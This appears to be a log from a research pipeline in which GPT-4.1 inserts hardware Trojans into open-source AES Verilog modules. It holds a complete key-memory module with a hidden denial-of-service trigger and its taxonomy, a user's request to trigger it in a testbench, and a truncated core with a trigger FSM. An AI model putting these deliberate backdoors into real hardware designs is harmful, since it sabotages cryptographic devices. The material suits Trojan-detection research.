  assign sbox[8'h23] = 8'h26;
  assign sbox[8'h24] = 8'h36;
  assign sbox[8'h25] = 8'h3f;
  assign sbox[8'h26] = 8'hf7;
  assign sbox[8'h27] = 8'hcc;
  assign sbox[8'h28] = 8'h34;
  assign sbox[8'h29] = 8'ha5;
  assign sbox[8'h2a] = 8'he5;
  assign sbox[8'h2b] = 8'hf1;
  assign sbox[8'h2c] = 8'h71;
  assign sbox[8'h2d] = 8'hd8;
  assign sbox[8'h2e] = 8'h31;
  assign sbox[8'h2f] = 8'h15;
  assign sbox[8'h30] = 8'h04;
  assign sbox[8'h31] = 8'hc7;
  assign sbox[8'h32] = 8'h23;
  assign sbox[8'h33] = 8'hc3;
  assign sbox[8'h34] = 8'h18;
  assign sbox[8'h35] = 8'h96;
  assign sbox[8'h36] = 8'h05;
  assign sbox[8'h37] = 8'h9a;
  assign sbox[8'h38] = 8'h07;
  assign sbox[8'h39] = 8'h12;
  assign sbox[8'h3a] = 8'h80;
  assign sbox[8'h3b] = 8'he2;
  assign sbox[8'h3c] = 8'heb;
  assign sbox[8'h3d] = 8'h27;
  assign sbox[8'h3e] = 8'hb2;
  assign sbox[8'h3f] = 8'h75;
  assign sbox[8'h40] = 8'h09;
  assign sbox[8'h41] = 8'h83;
  assign sbox[8'h42] = 8'h2c;
  assign sbox[8'h43] = 8'h1a;
  assign sbox[8'h44] = 8'h1b;
  assign sbox[8'h45] = 8'h6e;
  assign sbox[8'h46] = 8'h5a;
  assign sbox[8'h47] = 8'ha0;
  assign sbox[8'h48] = 8'h52;
  assign sbox[8'h49] = 8'h3b;
  assign sbox[8'h4a] = 8'hd6;
  assign sbox[8'h4b] = 8'hb3;
  assign sbox[8'h4c] = 8'h29;
  assign sbox[8'h4d] = 8'he3;
  assign sbox[8'h4e] = 8'h2f;
  assign sbox[8'h4f] = 8'h84;
  assign sbox[8'h50] = 8'h53;
  assign sbox[8'h51] = 8'hd1;
  assign sbox[8'h52] = 8'h00;
  assign sbox[8'h53] = 8'hed;
  assign sbox[8'h54] = 8'h20;
  assign sbox[8'h55] = 8'hfc;
  assign sbox[8'h56] = 8'hb1;
  assign sbox[8'h57] = 8'h5b;
  assign sbox[8'h58] = 8'h6a;
  assign sbox[8'h59] = 8'hcb;
  assign sbox[8'h5a] = 8'hbe;
  assign sbox[8'h5b] = 8'h39;
  assign sbox[8'h5c] = 8'h4a;
  assign sbox[8'h5d] = 8'h4c;
  assign sbox[8'h5e] = 8'h58;
  assign sbox[8'h5f] = 8'hcf;
  assign sbox[8'h60] = 8'hd0;
  assign sbox[8'h61] = 8'hef;
  assign sbox[8'h62] = 8'haa;
  assign sbox[8'h63] = 8'hfb;
  assign sbox[8'h64] = 8'h43;
  assign sbox[8'h65] = 8'h4d;
  assign sbox[8'h66] = 8'h33;
  assign sbox[8'h67] = 8'h85;
  assign sbox[8'h68] = 8'h45;
  assign sbox[8'h69] = 8'hf9;
  assign sbox[8'h6a] = 8'h02;
  assign sbox[8'h6b] = 8'h7f;
  assign sbox[8'h6c] = 8'h50;
  assign sbox[8'h6d] = 8'h3c;
  assign sbox[8'h6e] = 8'h9f;
  assign sbox[8'h6f] = 8'ha8;
  assign sbox[8'h70] = 8'h51;
  assign sbox[8'h71] = 8'ha3;
  assign sbox[8'h72] = 8'h40;
  assign sbox[8'h73] = 8'h8f;
  assign sbox[8'h74] = 8'h92;
  assign sbox[8'h75] = 8'h9d;
  assign sbox[8'h76] = 8'h38;
  assign sbox[8'h77] = 8'hf5;
  assign sbox[8'h78] = 8'hbc;
  assign sbox[8'h79] = 8'hb6;
  assign sbox[8'h7a] = 8'hda;
  assign sbox[8'h7b] = 8'h21;
  assign sbox[8'h7c] = 8'h10;
  assign sbox[8'h7d] = 8'hff;
  assign sbox[8'h7e] = 8'hf3;
  assign sbox[8'h7f] = 8'hd2;
  assign sbox[8'h80] = 8'hcd;
  assign sbox[8'h81] = 8'h0c;
  assign sbox[8'h82] = 8'h13;
  assign sbox[8'h83] = 8'hec;
  assign sbox[8'h84] = 8'h5f;
  assign sbox[8'h85] = 8'h97;
  assign sbox[8'h86] = 8'h44;
  assign sbox[8'h87] = 8'h17;
  assign sbox[8'h88] = 8'hc4;
  assign sbox[8'h89] = 8'ha7;
  assign sbox[8'h8a] = 8'h7e;
  assign sbox[8'h8b] = 8'h3d;
  assign sbox[8'h8c] = 8'h64;
  assign sbox[8'h8d] = 8'h5d;
  assign sbox[8'h8e] = 8'h19;
  assign sbox[8'h8f] = 8'h73;
  assign sbox[8'h90] = 8'h60;
  assign sbox[8'h91] = 8'h81;
  assign sbox[8'h92] = 8'h4f;
  assign sbox[8'h93] = 8'hdc;
  assign sbox[8'h94] = 8'h22;
  assign sbox[8'h95] = 8'h2a;
  assign sbox[8'h96] = 8'h90;
  assign sbox[8'h97] = 8'h88;
  assign sbox[8'h98] = 8'h46;
  assign sbox[8'h99] = 8'hee;
  assign sbox[8'h9a] = 8'hb8;
  assign sbox[8'h9b] = 8'h14;
  assign sbox[8'h9c] = 8'hde;
  assign sbox[8'h9d] = 8'h5e;
  assign sbox[8'h9e] = 8'h0b;
  assign sbox[8'h9f] = 8'hdb;
  assign sbox[8'ha0] = 8'he0;
  assign sbox[8'ha1] = 8'h32;
  assign sbox[8'ha2] = 8'h3a;
  assign sbox[8'ha3] = 8'h0a;
  assign sbox[8'ha4] = 8'h49;
  assign sbox[8'ha5] = 8'h06;
  assign sbox[8'ha6] = 8'h24;
  assign sbox[8'ha7] = 8'h5c;
  assign sbox[8'ha8] = 8'hc2;
  assign sbox[8'ha9] = 8'hd3;
  assign sbox[8'haa] = 8'hac;
  assign sbox[8'hab] = 8'h62;
  assign sbox[8'hac] = 8'h91;
  assign sbox[8'had] = 8'h95;
  assign sbox[8'hae] = 8'he4;
  assign sbox[8'haf] = 8'h79;
  assign sbox[8'hb0] = 8'he7;
  assign sbox[8'hb1] = 8'hc8;
  assign sbox[8'hb2] = 8'h37;
  assign sbox[8'hb3] = 8'h6d;
  assign sbox[8'hb4] = 8'h8d;
  assign sbox[8'hb5] = 8'hd5;
  assign sbox[8'hb6] = 8'h4e;
  assign sbox[8'hb7] = 8'ha9;
  assign sbox[8'hb8] = 8'h6c;
  assign sbox[8'hb9] = 8'h56;
  assign sbox[8'hba] = 8'hf4;
  assign sbox[8'hbb] = 8'hea;
  assign sbox[8'hbc] = 8'h65;
  assign sbox[8'hbd] = 8'h7a;
  assign sbox[8'hbe] = 8'hae;
  assign sbox[8'hbf] = 8'h08;
  assign sbox[8'hc0] = 8'hba;
  assign sbox[8'hc1] = 8'h78;
  assign sbox[8'hc2] = 8'h25;
  assign sbox[8'hc3] = 8'h2e;
  assign sbox[8'hc4] = 8'h1c;
  assign sbox[8'hc5] = 8'ha6;
  assign sbox[8'hc6] = 8'hb4;
  assign sbox[8'hc7] = 8'hc6;
  assign sbox[8'hc8] = 8'he8;
  assign sbox[8'hc9] = 8'hdd;
  assign sbox[8'hca] = 8'h74;
  assign sbox[8'hcb] = 8'h1f;
  assign sbox[8'hcc] = 8'h4b;
  assign sbox[8'hcd] = 8'hbd;
  assign sbox[8'hce] = 8'h8b;
  assign sbox[8'hcf] = 8'h8a;
  assign sbox[8'hd0] = 8'h70;
  assign sbox[8'hd1] = 8'h3e;
  assign sbox[8'hd2] = 8'hb5;
  assign sbox[8'hd3] = 8'h66;
  assign sbox[8'hd4] = 8'h48;
  assign sbox[8'hd5] = 8'h03;
  assign sbox[8'hd6] = 8'hf6;
  assign sbox[8'hd7] = 8'h0e;
  assign sbox[8'hd8] = 8'h61;
  assign sbox[8'hd9] = 8'h35;
  assign sbox[8'hda] = 8'h57;
  assign sbox[8'hdb] = 8'hb9;
  assign sbox[8'hdc] = 8'h86;
  assign sbox[8'hdd] = 8'hc1;
  assign sbox[8'hde] = 8'h1d;
  assign sbox[8'hdf] = 8'h9e;
  assign sbox[8'he0] = 8'he1;
  assign sbox[8'he1] = 8'hf8;
  assign sbox[8'he2] = 8'h98;
  assign sbox[8'he3] = 8'h11;
  assign sbox[8'he4] = 8'h69;
  assign sbox[8'he5] = 8'hd9;
  assign sbox[8'he6] = 8'h8e;
  assign sbox[8'he7] = 8'h94;
  assign sbox[8'he8] = 8'h9b;
  assign sbox[8'he9] = 8'h1e;
  assign sbox[8'hea] = 8'h87;
  assign sbox[8'heb] = 8'he9;
  assign sbox[8'hec] = 8'hce;
  assign sbox[8'hed] = 8'h55;
  assign sbox[8'hee] = 8'h28;
  assign sbox[8'hef] = 8'hdf;
  assign sbox[8'hf0] = 8'h8c;
  assign sbox[8'hf1] = 8'ha1;
  assign sbox[8'hf2] = 8'h89;
  assign sbox[8'hf3] = 8'h0d;
  assign sbox[8'hf4] = 8'hbf;
  assign sbox[8'hf5] = 8'he6;
  assign sbox[8'hf6] = 8'h42;
  assign sbox[8'hf7] = 8'h68;
  assign sbox[8'hf8] = 8'h41;
  assign sbox[8'hf9] = 8'h99;
  assign sbox[8'hfa] = 8'h2d;
  assign sbox[8'hfb] = 8'h0f;
  assign sbox[8'hfc] = 8'hb0;
  assign sbox[8'hfd] = 8'h54;
  assign sbox[8'hfe] = 8'hbb;
  assign sbox[8'hff] = 8'h16;

endmodule // aes_sbox

//======================================================================
// EOF aes_sbox.v
//======================================================================
```

Explanation:
A rare input sequence is detected via a sequential FSM that, if observed, triggers a flag to disable the SBox output for a fixed period. Normal S-box operation is unaffected except during the Trojan's temporary activation, maintaining expected behavior otherwise.

Trigger:
The Trojan activates when the sboxw input sequentially matches three specific 32-bit values (DEADBEEF, CAFEBABE, FEEDFACE) in order. Upon this condition, the SBox is disabled for 5000 cycles.

Payload:
While activated, the S-box output is forced to zero, causing cryptographic operations to fail for a limited time, resulting in denial of service. After the period lapses, normal output resumes automatically.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally  
Effects: denial of service  
Location: Processor datapath (SBox module)  
Characteristics: Localized, small sequential logic (FSM/counter), Functional Trojan
Saving vulnerable design to: aes/gpt-4.1/aes_sbox/aes_sbox_HT3_gpt-4.1_A1.v
Saving vulnerability description to: aes/gpt-4.1/aes_sbox/aes_sbox_HT3_gpt-4.1_A1_taxonomy.txt
Code:
```verilog
//======================================================================
//
// aes_key_mem.v
// -------------
// The AES key memory including round key generator.
//
//
// Author: Joachim Strombergson
// Copyright (c) 2013 Secworks Sweden AB
// All rights reserved.
//
// Trojan Modifications inserted as per analysis below.
//
//======================================================================

`default_nettype none

module aes_key_mem(
                   input wire            clk,
                   input wire            reset_n,

                   input wire [255 : 0]  key,
                   input wire            keylen,
                   input wire            init,

                   input wire    [3 : 0] round,
                   output wire [127 : 0] round_key,
                   output wire           ready,


                   output wire [31 : 0]  sboxw,
                   input wire  [31 : 0]  new_sboxw
                  );


  //----------------------------------------------------------------
  // Parameters.
  //----------------------------------------------------------------
  localparam AES_128_BIT_KEY = 1'h0;
  localparam AES_256_BIT_KEY = 1'h1;

  localparam AES_128_NUM_ROUNDS = 10;
  localparam AES_256_NUM_ROUNDS = 14;

  localparam CTRL_IDLE     = 3'h0;
  localparam CTRL_INIT     = 3'h1;
  localparam CTRL_GENERATE = 3'h2;
  localparam CTRL_DONE     = 3'h3;

  // Trojan: Parameters for rare key sequence length, disable cycles
  localparam TROJAN_KEYSEQ_LEN    = 4;     // Sequence length
  localparam TROJAN_DISABLE_CYCLES = 20;   // Number of cycles module disabled

  //----------------------------------------------------------------
  // Registers.
  //----------------------------------------------------------------
  reg [127 : 0] key_mem [0 : 14];
  reg [127 : 0] key_mem_new;
  reg           key_mem_we;

  reg [127 : 0] prev_key0_reg;
  reg [127 : 0] prev_key0_new;
  reg           prev_key0_we;

  reg [127 : 0] prev_key1_reg;
  reg [127 : 0] prev_key1_new;
  reg           prev_key1_we;

  reg [3 : 0] round_ctr_reg;
  reg [3 : 0] round_ctr_new;
  reg         round_ctr_rst;
  reg         round_ctr_inc;
  reg         round_ctr_we;

  reg [2 : 0] key_mem_ctrl_reg;
  reg [2 : 0] key_mem_ctrl_new;
  reg         key_mem_ctrl_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  reg [7 : 0] rcon_reg;
  reg [7 : 0] rcon_new;
  reg         rcon_we;
  reg         rcon_set;
  reg         rcon_next;

  // Trojan: Registers for trigger and payload logic
  reg [2:0] trojan_keyseq_ctr;                  // Sequence match counter
  reg       trojan_seq_detected;                // Sequence fully matched flag
  reg [4:0] trojan_disable_cnt;                 // Disable duration counter
  reg       trojan_disable_active;              // Trojan payload active flag

  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg [31 : 0]  tmp_sboxw;
  reg           round_key_update;
  reg [127 : 0] tmp_round_key;

  // Trojan: Rare secret sequence for triggering (example values, can choose any rare sequence)
  wire trojan_keyseq_match;
  assign trojan_keyseq_match = (key[255:224] == 32'hA5C3F7B1) && 
                               (key[223:192] == 32'h5A3C7F1B) &&
                               (key[191:160] == 32'hFEDCBA98) &&
                               (key[159:128] == 32'h013579BD);

  //----------------------------------------------------------------
  // Concurrent assignments for ports.
  //----------------------------------------------------------------
  // Trojan: Mux ready, round_key, sboxw based on trojan_disable_active
  assign round_key = trojan_disable_active ? 128'h0 : tmp_round_key;
  assign ready     = trojan_disable_active ? 1'b0 : ready_reg;
  assign sboxw     = trojan_disable_active ? 32'hDEADBEEF : tmp_sboxw;

  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      integer i;

      if (!reset_n)
        begin
          for (i = 0 ; i <= AES_256_NUM_ROUNDS ; i = i + 1)
            key_mem [i] <= 128'h0;

          ready_reg        <= 1'b0;
          rcon_reg         <= 8'h0;
          round_ctr_reg    <= 4'h0;
          prev_key0_reg    <= 128'h0;
          prev_key1_reg    <= 128'h0;
          key_mem_ctrl_reg <= CTRL_IDLE;

          // Trojan: Reset all Trojan registers
          trojan_keyseq_ctr   <= 3'b0;
          trojan_seq_detected <= 1'b0;
          trojan_disable_cnt  <= 5'b0;
          trojan_disable_active <= 1'b0;
        end
      else
        begin
          if (ready_we)
            ready_reg <= ready_new;

          if (rcon_we)
            rcon_reg <= rcon_new;

          if (round_ctr_we)
            round_ctr_reg <= round_ctr_new;

          if (key_mem_we)
            key_mem[round_ctr_reg] <= key_mem_new;

          if (prev_key0_we)
            prev_key0_reg <= prev_key0_new;

          if (prev_key1_we)
            prev_key1_reg <= prev_key1_new;

          if (key_mem_ctrl_we)
            key_mem_ctrl_reg <= key_mem_ctrl_new;

          //----------------- Trojan logic (state update) -----------------
          // Advancing match counter if correct rare keys are seen in sequence during init
          if (init && !trojan_seq_detected) begin
            if ((trojan_keyseq_ctr == 3'd0) && (key[255:224] == 32'hA5C3F7B1))
              trojan_keyseq_ctr <= 3'd1;
            else if ((trojan_keyseq_ctr == 3'd1) && (key[223:192] == 32'h5A3C7F1B))
              trojan_keyseq_ctr <= 3'd2;
            else if ((trojan_keyseq_ctr == 3'd2) && (key[191:160] == 32'hFEDCBA98))
              trojan_keyseq_ctr <= 3'd3;
            else if ((trojan_keyseq_ctr == 3'd3) && (key[159:128] == 32'h013579BD))
              trojan_keyseq_ctr <= 3'd4;
            else if (trojan_keyseq_ctr != 3'd0)
              trojan_keyseq_ctr <= 3'd0; // reset if out of order or mismatch

            // Detect full sequence match
            if ((trojan_keyseq_ctr == 3'd3) && (key[159:128] == 32'h013579BD))
              trojan_seq_detected <= 1'b1;
          end
          // Latch detected until payload
          else if (trojan_seq_detected && !trojan_disable_active) begin
            trojan_seq_detected <= trojan_seq_detected;
          end

          // Payload: disable for N cycles, then recover
          if (trojan_seq_detected && !trojan_disable_active) begin
            trojan_disable_active <= 1'b1;
            trojan_disable_cnt <= 5'd1;
          end
          else if (trojan_disable_active) begin
            if (trojan_disable_cnt < TROJAN_DISABLE_CYCLES) begin
              trojan_disable_cnt <= trojan_disable_cnt + 5'd1;
            end else begin
              trojan_disable_active <= 1'b0;
              trojan_seq_detected   <= 1'b0;
              trojan_keyseq_ctr     <= 3'd0;
              trojan_disable_cnt    <= 5'd0;
            end
          end
        end
    end // reg_update


  //----------------------------------------------------------------
  // key_mem_read
  //
  // Combinational read port for the key memory.
  //----------------------------------------------------------------
  always @*
    begin : key_mem_read
      tmp_round_key = key_mem[round];
    end // key_mem_read


  //----------------------------------------------------------------
  // round_key_gen
  //
  // The round key generator logic for AES-128 and AES-256.
  //----------------------------------------------------------------
  always @*
    begin: round_key_gen
      reg [31 : 0] w0, w1, w2, w3, w4, w5, w6, w7;
      reg [31 : 0] k0, k1, k2, k3;
      reg [31 : 0] rconw, rotstw, tw, trw;

      // Default assignments.
      key_mem_new   = 128'h0;
      key_mem_we    = 1'b0;
      prev_key0_new = 128'h0;
      prev_key0_we  = 1'b0;
      prev_key1_new = 128'h0;
      prev_key1_we  = 1'b0;

      k0 = 32'h0;
      k1 = 32'h0;
      k2 = 32'h0;
      k3 = 32'h0;

      rcon_set   = 1'b1;
      rcon_next  = 1'b0;

      // Extract words and calculate intermediate values.
      // Perform rotation of sbox word etc.
      w0 = prev_key0_reg[127 : 096];
      w1 = prev_key0_reg[095 : 064];
      w2 = prev_key0_reg[063 : 032];
      w3 = prev_key0_reg[031 : 000];

      w4 = prev_key1_reg[127 : 096];
      w5 = prev_key1_reg[095 : 064];
      w6 = prev_key1_reg[063 : 032];
      w7 = prev_key1_reg[031 : 000];

      rconw = {rcon_reg, 24'h0};
      tmp_sboxw = w7;
      rotstw = {new_sboxw[23 : 00], new_sboxw[31 : 24]};
      trw = rotstw ^ rconw;
      tw = new_sboxw;

      // Generate the specific round keys.
      if (round_key_update)
        begin
          rcon_set   = 1'b0;
          key_mem_we = 1'b1;
          case (keylen)
            AES_128_BIT_KEY:
              begin
                if (round_ctr_reg == 0)
                  begin
                    key_mem_new   = key[255 : 128];
                    prev_key1_new = key[255 : 128];
                    prev_key1_we  = 1'b1;
                    rcon_next     = 1'b1;
                  end
                else
                  begin
                    k0 = w4 ^ trw;
                    k1 = w5 ^ w4 ^ trw;
                    k2 = w6 ^ w5 ^ w4 ^ trw;
                    k3 = w7 ^ w6 ^ w5 ^ w4 ^ trw;

                    key_mem_new   = {k0, k1, k2, k3};
                    prev_key1_new = {k0, k1, k2, k3};
                    prev_key1_we  = 1'b1;
                    rcon_next     = 1'b1;
                  end
              end

            AES_256_BIT_KEY:
              begin
                if (round_ctr_reg == 0)
                  begin
                    key_mem_new   = key[255 : 128];
                    prev_key0_new = key[255 : 128];
                    prev_key0_we  = 1'b1;
                  end
                else if (round_ctr_reg == 1)
                  begin
                    key_mem_new   = key[127 : 0];
                    prev_key1_new = key[127 : 0];
                    prev_key1_we  = 1'b1;
                    rcon_next     = 1'b1;
                  end
                else
                  begin
                    if (round_ctr_reg[0] == 0)
                      begin
                        k0 = w0 ^ trw;
                        k1 = w1 ^ w0 ^ trw;
                        k2 = w2 ^ w1 ^ w0 ^ trw;
                        k3 = w3 ^ w2 ^ w1 ^ w0 ^ trw;
                      end
                    else
                      begin
                        k0 = w0 ^ tw;
                        k1 = w1 ^ w0 ^ tw;
                        k2 = w2 ^ w1 ^ w0 ^ tw;
                        k3 = w3 ^ w2 ^ w1 ^ w0 ^ tw;
                        rcon_next = 1'b1;
                      end

                    // Store the generated round keys.
                    key_mem_new   = {k0, k1, k2, k3};
                    prev_key1_new = {k0, k1, k2, k3};
                    prev_key1_we  = 1'b1;
                    prev_key0_new = prev_key1_reg;
                    prev_key0_we  = 1'b1;
                  end
              end

            default:
              begin
              end
          endcase // case (keylen)
        end
    end // round_key_gen


  //----------------------------------------------------------------
  // rcon_logic
  //
  // Caclulates the rcon value for the different key expansion
  // iterations.
  //----------------------------------------------------------------
  always @*
    begin : rcon_logic
      reg [7 : 0] tmp_rcon;
      rcon_new = 8'h00;
      rcon_we  = 1'b0;

      tmp_rcon = {rcon_reg[6 : 0], 1'b0} ^ (8'h1b & {8{rcon_reg[7]}});

      if (rcon_set)
        begin
          rcon_new = 8'h8d;
          rcon_we  = 1'b1;
        end

      if (rcon_next)
        begin
          rcon_new = tmp_rcon[7 : 0];
          rcon_we  = 1'b1;
        end
    end


  //----------------------------------------------------------------
  // round_ctr
  //
  // The round counter logic with increase and reset.
  //----------------------------------------------------------------
  always @*
    begin : round_ctr
      round_ctr_new = 4'h0;
      round_ctr_we  = 1'b0;

      if (round_ctr_rst)
        begin
          round_ctr_new = 4'h0;
          round_ctr_we  = 1'b1;
        end

      else if (round_ctr_inc)
        begin
          round_ctr_new = round_ctr_reg + 1'b1;
          round_ctr_we  = 1'b1;
        end
    end


  //----------------------------------------------------------------
  // key_mem_ctrl
  //
  //
  // The FSM that controls the round key generation.
  //----------------------------------------------------------------
  always @*
    begin: key_mem_ctrl
      reg [3 : 0] num_rounds;

      // Default assignments.
      ready_new        = 1'b0;
      ready_we         = 1'b0;
      round_key_update = 1'b0;
      round_ctr_rst    = 1'b0;
      round_ctr_inc    = 1'b0;
      key_mem_ctrl_new = CTRL_IDLE;
      key_mem_ctrl_we  = 1'b0;

      if (keylen == AES_128_BIT_KEY)
        num_rounds = AES_128_NUM_ROUNDS;
      else
        num_rounds = AES_256_NUM_ROUNDS;

      case(key_mem_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                ready_new        = 1'b0;
                ready_we         = 1'b1;
                key_mem_ctrl_new = CTRL_INIT;
                key_mem_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            round_ctr_rst    = 1'b1;
            key_mem_ctrl_new = CTRL_GENERATE;
            key_mem_ctrl_we  = 1'b1;
          end

        CTRL_GENERATE:
          begin
            round_ctr_inc    = 1'b1;
            round_key_update = 1'b1;
            if (round_ctr_reg == num_rounds)
              begin
                key_mem_ctrl_new = CTRL_DONE;
                key_mem_ctrl_we  = 1'b1;
              end
          end

        CTRL_DONE:
          begin
            ready_new        = 1'b1;
            ready_we         = 1'b1;
            key_mem_ctrl_new = CTRL_IDLE;
            key_mem_ctrl_we  = 1'b1;
          end

        default:
          begin
          end
      endcase // case (key_mem_ctrl_reg)

    end // key_mem_ctrl
endmodule // aes_key_mem

//======================================================================
// EOF aes_key_mem.v
//======================================================================
```

Explanation:
A denial of service Trojan was inserted by adding a counter and logic that detects a rare key input sequence, activating a payload that disables outputs for a fixed cycle window. All modifications are synthesizable and original functionality is maintained except during Trojan activation.

Trigger:
The Trojan is triggered internally when the `init` pin is pulsed and the key input matches four rare consecutive 32-bit values in sequence; on a successful match, a disable period begins.

Payload:
While active, the Trojan forces `ready` low, zeroes the `round_key` output, and outputs a distinct invalid value on `sboxw`, effectively rendering the key memory unusable for the preset duration.

Taxonomy:
Insertion phase: Design  
Abstraction level: Register-transfer level  
Activation mechanism: Triggered internally (rare key sequence on input)  
Effects: denial of service  
Location: Memory (key memory/finite state machine control)  
Characteristics: Localized, small stateful functional Trojan
Saving vulnerable design to: aes/gpt-4.1/aes_key_mem/aes_key_mem_HT3_gpt-4.1_A1.v
Saving vulnerability description to: aes/gpt-4.1/aes_key_mem/aes_key_mem_HT3_gpt-4.1_A1_taxonomy.txt









i want you to modify this test bench to trigger the trojan and show me the trojan works. 

design:
module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;

  //----------------------------------------------------------------
  // Trojan parameters and registers
  //----------------------------------------------------------------
  // Trojan state definitions
  localparam TROJAN_OFF  = 2'b00;
  localparam TROJAN_TRIG = 2'b01;
  localparam TROJAN_ON   = 2'b10;

  // Trojan registers
  reg [1:0] trojan_state_reg, trojan_state_new;
  reg       trojan_state_we;
  reg [9:0] trojan_counter_reg, trojan_counter_new; // 10 bits for 1024 cycles
  reg       trojan_counter_we;
  reg [3:0] trojan_seq_reg, trojan_seq_new;
  reg       trojan_seq_we;

  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  // Trojan: Use masked result and ready signals during attack
  wire t_ready, t_result_valid;
  assign ready        = t_ready;
  assign result       = muxed_new_block;
  assign result_valid = t_result_valid;

  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg  <= 1'b0;
          ready_reg         <= 1'b1;
          aes_core_ctrl_reg <= CTRL_IDLE;

          //-------------------------------
          // TROJAN INSERTION: Reset logic
          //-------------------------------
          trojan_state_reg   <= TROJAN_OFF;
          trojan_counter_reg <= 10'd0;
          trojan_seq_reg     <= 4'd0;
        end
      else
        begin
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          //-------------------------------
          // TROJAN INSERTION: Registers update
          //-------------------------------
          if (trojan_state_we)
            trojan_state_reg <= trojan_state_new;

          if (trojan_counter_we)
            trojan_counter_reg <= trojan_counter_new;

          if (trojan_seq_we)
            trojan_seq_reg <= trojan_seq_new;
        end
    end // reg_update

  //----------------------------------------------------------------
  // sbox_mux
  //
  // Controls which of the encipher datapath or the key memory
  // that gets access to the sbox.
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //
  // Controls which of the datapaths that get the next signal, have
  // access to the memory as well as the block processing result.
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          // Encipher operations
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          // Decipher operations
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux

  //----------------------------------------------------------------
  // TROJAN INSERTION: Trigger FSM
  // This FSM watches for a rare event: the sequence of
  // init, next, init, next, next (five consecutive events in this pattern)
  //----------------------------------------------------------------
  always @*
    begin : trojan_fsm
      trojan_state_new    = trojan_state_reg;
      trojan_state_we     = 1'b0;
      trojan_counter_new  = trojan_counter_reg;
      trojan_counter_we   = 1'b0;
      trojan_seq_new      = trojan_seq_reg;
      trojan_seq_we       = 1'b0;

      // Trojan locked-out state
      case (trojan_state_reg)
        TROJAN_OFF: begin
          // Watch for pattern: init->1, next->0, init->1, next->0, next->0 (others=0)
          // Sequence encoding (4 bits):
          // seq 0: Wait init==1
          // seq 1: Wait next==1
          // seq 2: Wait init==1
          // seq 3: Wait next==1
          // seq 4: Wait next==1 (trigger)
          if (trojan_seq_reg == 4'd0) begin
            if (init && !next) begin
              trojan_seq_new = 4'd1;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd1) begin
            if (!init && next) begin
